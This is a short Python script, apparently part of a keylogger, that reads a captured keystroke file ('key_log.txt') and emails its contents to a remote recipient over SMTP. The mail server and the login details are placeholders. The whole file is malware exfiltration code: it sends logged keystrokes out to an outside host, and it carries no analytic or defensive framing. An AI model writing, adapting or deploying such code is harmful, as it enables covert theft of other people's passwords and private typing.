import smtplib
from email.mime.text import MIMEText

log_file = "key_log.txt"

def send_email(log_file):
    with open(log_file, 'r') as f:
        log_data = f.read()

    msg = MIMEText(log_data)
    msg['Subject'] = 'Keylogger Logs'
    msg['From'] = 'your_email@example.com'
    msg['To'] = 'recipient@example.com'

    with smtplib.SMTP('smtp.example.com', 587) as server:
        server.starttls()
        server.login('your_email@example.com', 'password')
        server.sendmail('your_email@example.com', 'recipient@example.com', msg.as_string())

send_email(log_file)